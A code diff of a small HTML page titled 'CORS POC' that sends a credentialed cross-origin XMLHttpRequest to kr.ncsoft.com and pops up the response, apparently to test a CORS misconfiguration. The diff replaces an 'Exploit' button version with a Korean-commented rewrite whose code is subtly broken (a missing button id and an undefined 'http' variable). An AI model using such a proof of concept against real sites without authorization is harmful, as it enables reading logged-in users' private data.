@@ -3,21 +3,34 @@
 <body>
 <center>
 <h2>CORS POC<h2>
-<div id="test">
-<button type="button" onclick="cors() ">Exploit</button>
- </div>
-<script> function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "https://kr.ncsoft.com", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-  xhttp.onreadystatechange = function()
-  {
-  	if(this.readyState == 4 && this.status == 200) {
-		document.getElementById("test").innerHTML = alert(this.responseText);
-	}
-  };
-}
+<script>
+(function() {
+  var httpRequest;
+  document.getElementById("ajaxButton").addEventListener('click', makeRequest);
+
+  function makeRequest() {
+    httpRequest = new XMLHttpRequest();
+
+    if(!httpRequest) {
+      alert('XMLHTTP 인스턴스를 만들 수가 없어요 ㅠㅠ');
+      return false;
+    }
+    httpRequest.onreadystatechange = alertContents;
+    httpRequest.open('GET', 'https://kr.ncsoft.com', true);
+    http.withCredentials = true;
+    httpRequest.send();
+  }
+
+  function alertContents() {
+    if (httpRequest.readyState === XMLHttpRequest.DONE) {
+      if (httpRequest.status === 200) {
+        alert(httpRequest.responseText);
+      } else {
+        alert('request에 뭔가 문제가 있어요.');
+      }
+    }
+  }
+})();
 </script>
 </body>
 </html>
